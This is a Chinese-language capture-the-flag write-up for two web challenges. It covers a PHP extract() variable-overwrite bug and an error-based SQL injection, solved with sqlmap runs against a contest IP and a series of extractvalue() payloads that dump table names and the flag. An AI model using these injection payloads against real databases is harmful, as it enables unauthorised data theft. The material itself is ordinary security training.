---
title: NICO冬令营第一次比赛
description: 
published: true
date: 2022-07-17T15:48:12.336Z
tags: 
editor: markdown
dateCreated: 2022-07-17T15:34:33.925Z
---

# Web
## web1

```php
<?php
	//author: Elaine
	include('./flag.php');
	highlight_file(__FILE__);
	$admin = 'false';
	$guest = 'true';
	extract($_GET); # 读取传入数据的变量
	if (md5($admin) == md5($guest)) {
	    echo $FLAG;
	} else{
	    echo "nonono!";
	}
?>
```

这题相对简单，因为`extract`函数可以覆盖原有变量的数据，所以选择`$admin`和`$guest`两个变量其中一个的值覆写一下，让判断为真就可以了：
![72782a9b-6e65-42e0-8340-9e482108919a.png](/72782a9b-6e65-42e0-8340-9e482108919a.png)

## SQL

通过抓包，可以发现请求是通过POST传输的，那么先祭出`sqlmap`测试一下
![21cd3092-9893-473b-9773-11b351f7cbc2.png](/21cd3092-9893-473b-9773-11b351f7cbc2.png)
```bash
sqlmap --random-agent --risk=3 --drop-set-cookie -u http://121.37.5.94:8305/ --form
```
![a7838e45-0b48-44fd-98ed-f27b18bdaa3d.png](/a7838e45-0b48-44fd-98ed-f27b18bdaa3d.png)
可以看出`sqlmap`检测出了可注入，那么测试一下自动注入：
```
sqlmap --random-agent --risk=3 --drop-set-cookie -u http://121.37.5.94:8305/ --form --dbs
```
![a96b26f0-9e51-4262-87a8-35e21ccbe8a1.png](/a96b26f0-9e51-4262-87a8-35e21ccbe8a1.png)
可以看出注入点存在，但是`sqlmap`无法实现自动注入，那么尝试手注：
```bash
tt=1'and extractvalue(1,concat(1,(select user()))) %23
```
![4fe89ac1-38b9-45a2-99a6-119af6a6ffd4.png](/4fe89ac1-38b9-45a2-99a6-119af6a6ffd4.png)
```bash
tt=1'and extractvalue(1,concat(1,(select database()))) %23
```
![aa7d0f2b-a3c2-4aeb-ae30-5da582a10f82.png](/aa7d0f2b-a3c2-4aeb-ae30-5da582a10f82.png)
由此已经得到了一个数据库：`error_sql`，接下来爆出库内的表名：
```bash
tt=1'and extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema='error_sql'))) %23
```
![26b87fba-05b5-44af-a36f-d3c385e54071.png](/26b87fba-05b5-44af-a36f-d3c385e54071.png)
那么已经知道库内有两个表：`data`,`flag_here`，接着爆`flag_here`:
```bash
tt=1'and extractvalue(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name='flag_here'))) %23
```
![9e3f4944-6087-440e-861b-3fba5bcb8764.png](/9e3f4944-6087-440e-861b-3fba5bcb8764.png)
那么只需爆出`data`的数据就好了：
```bash
tt=1'and extractvalue(1,concat(1,(select group_concat(data) from flag_here))) %23
```
![fc1e1d36-f509-4fe8-9896-229ff6e27f74.png](/fc1e1d36-f509-4fe8-9896-229ff6e27f74.png)
但是比较糟糕，报错信息限制了数据的显示，那么采取分段显示：
```bash
tt=1'and extractvalue(1,concat(1,(select mid(group_concat(data),1,16) from flag_here))) %23
```
![1f670c79-c78e-4070-9983-5ab7c428c742.png](/1f670c79-c78e-4070-9983-5ab7c428c742.png)
```bash
tt=1'and extractvalue(1,concat(1,(select mid(group_concat(data),17,21) from flag_here))) %23
```
![c98b3706-c579-4cc8-a066-cf9adc7ec3a1.png](/c98b3706-c579-4cc8-a066-cf9adc7ec3a1.png)
得到了flag：
```text
NICO{eRr0r_inJect10n_1s_in7er35tin9!}
```